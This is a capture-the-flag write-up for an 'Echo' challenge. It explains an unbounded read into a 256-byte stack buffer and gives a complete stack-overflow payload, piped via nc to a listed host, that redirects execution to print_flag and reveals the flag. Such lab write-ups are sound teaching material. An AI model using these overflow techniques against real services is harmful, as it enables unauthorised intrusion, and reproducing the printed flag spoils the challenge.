# Echo

## Description
This simple server echos back what it hears. Can you make it say so̸met̸hing ḍ̣͂̅i̮̓f̆f̛ḙ̊rḙ̊nt̮̏?

## Solution
The challenge is to force the echo server to echo back the flag. The server is easily exploited, with many ways to
solve. ASLR and stack protections have been disabled.

The echo buffer is limited to 256 bytes, but the read is not. A simple stack overflow exists.

A helper function `print_flag()` is available. Simply writing past the end of the buffer with this address (plus an
extra word) can trigger the application to call this function.

Disassembling the provided app binary shows:
```
...
0000000000401176 <print_flag>:
  401176: f3 0f 1e fa                  	endbr64
  40117a: 48 83 ec 08                  	subq	$0x8, %rsp
...
```

Writing 256 + 8`a`'s, then `\x76\x11\x40` works. Adding an addition null byte and newline helps us get through `socat`
more easily, and doesn't interfere with the result (the newline is not written to the stack)

```
$ echo -e 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\x76\x11\x40\x00' | nc 54.85.45.101 8008
ECHO! Echo! echo!
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaav@
flag{curs3d_are_y0ur_eyes_for_they_see_the_fl4g}
^^ Flag!!111!!!! ^^
```
